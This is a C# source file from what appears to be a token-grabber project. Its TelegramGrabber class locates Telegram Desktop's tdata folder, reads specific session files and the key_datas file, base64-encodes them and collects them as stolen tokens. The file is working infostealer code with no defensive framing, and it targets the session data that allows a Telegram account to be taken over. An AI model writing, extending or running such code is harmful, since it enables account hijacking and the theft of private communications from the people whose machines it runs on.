namespace TokenGrabber.Grabbers;

using TokenGrabber.Models;

internal sealed class TelegramGrabber : ITokenGrabber
{
    private static readonly string TelegramDataPath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop", "tdata");

    private static readonly string[] SessionFiles = ["D877F783D5D3EF8C", "A7FDF864FBC10B77", "F8806DD0C461824F"];

    public List<GrabbedToken> Extract()
    {
        var tokens = new List<GrabbedToken>();

        if (!Directory.Exists(TelegramDataPath))
            return tokens;

        foreach (var sessionFile in SessionFiles)
        {
            var filePath = Path.Combine(TelegramDataPath, sessionFile);
            if (!File.Exists(filePath)) continue;

            var mapPath = Path.Combine(TelegramDataPath, sessionFile, "map0");
            var mapExists = File.Exists(mapPath);

            var data = File.ReadAllBytes(filePath);
            var encoded = Convert.ToBase64String(data);

            tokens.Add(new GrabbedToken
            {
                Token = encoded,
                Platform = "Telegram",
                Source = $"tdata/{sessionFile}" + (mapExists ? " (with map)" : ""),
                ExtractedAt = DateTime.UtcNow
            });
        }

        ExtractKeyData(tokens);
        return tokens;
    }

    private static void ExtractKeyData(List<GrabbedToken> tokens)
    {
        var keyPath = Path.Combine(TelegramDataPath, "key_datas");
        if (!File.Exists(keyPath)) return;

        var keyData = File.ReadAllBytes(keyPath);
        tokens.Add(new GrabbedToken
        {
            Token = Convert.ToBase64String(keyData),
            Platform = "Telegram",
            Source = "tdata/key_datas",
            ExtractedAt = DateTime.UtcNow
        });
    }
}
